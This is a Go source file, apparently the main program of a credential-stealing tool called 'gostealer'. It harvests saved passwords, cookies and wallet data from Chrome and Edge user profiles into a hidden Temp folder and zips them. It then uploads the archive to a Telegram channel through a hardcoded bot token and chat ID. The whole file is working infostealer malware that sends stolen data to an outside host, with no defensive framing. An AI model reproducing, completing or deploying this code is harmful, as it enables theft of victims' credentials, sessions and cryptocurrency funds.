package main

import (
	"os"
	"path"
	"sync"

	"github.com/4kord/gostealer/browsers"
	"github.com/4kord/gostealer/utils"
	"github.com/alexmullins/zip"
	"github.com/joho/godotenv"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

func main() {
	godotenv.Load()

	logFolderPath := path.Join(os.Getenv("localappdata"), "Temp", "65AC86F1-FB92-41E6-B994-DD784CF9")
	wg := sync.WaitGroup{}
	//Create folder structure
	utils.CreateStructure(logFolderPath)

	//Browser paths
	edgePath := path.Join(os.Getenv("localappdata"), `Microsoft\Edge\User Data`)
	chromePath := path.Join(os.Getenv("localappdata"), `Google\Chrome\User Data`)

	//Yoink browsers' passwords, cookies, wallets
	wg.Add(1)
	go func() {
		browsers.Chrome(chromePath, logFolderPath)
		wg.Done()
	}()
	wg.Add(1)
	go func() {
		browsers.Edge(edgePath, logFolderPath)
		wg.Done()
	}()
	wg.Wait()

	//Create zip
	outFile, err := os.Create(path.Join(os.Getenv("localappdata"), "Temp", "65AC86F1-FB92-41E6-B994-DD784CF9.zip"))
	if err != nil {
		panic(err)
	}
	defer outFile.Close()

	w := zip.NewWriter(outFile)

	utils.AddFiles(w, logFolderPath+"/", "")

	if err != nil {
		panic(err)
	}

	err = w.Close()
	if err != nil {
		panic(err)
	}

	//Send log
	file, err := os.ReadFile(path.Join(os.Getenv("localappdata"), "Temp", "65AC86F1-FB92-41E6-B994-DD784CF9.zip"))
	if err != nil {
		panic(err)
	}

	bot, err := tgbotapi.NewBotAPI("1664618644:AAE7TvjRGvUagMxkulUclo5AD3BwUMul-i4")
	if err != nil {
		panic(err)
	}

	media := tgbotapi.NewInputMediaDocument(tgbotapi.FileBytes{
		Name:  "log.zip",
		Bytes: file,
	})

	bot.Send(tgbotapi.MediaGroupConfig{
		ChatID:          -1001563265930,
		ChannelUsername: "logs",

		Media: []interface{}{
			media,
		},
	})
}
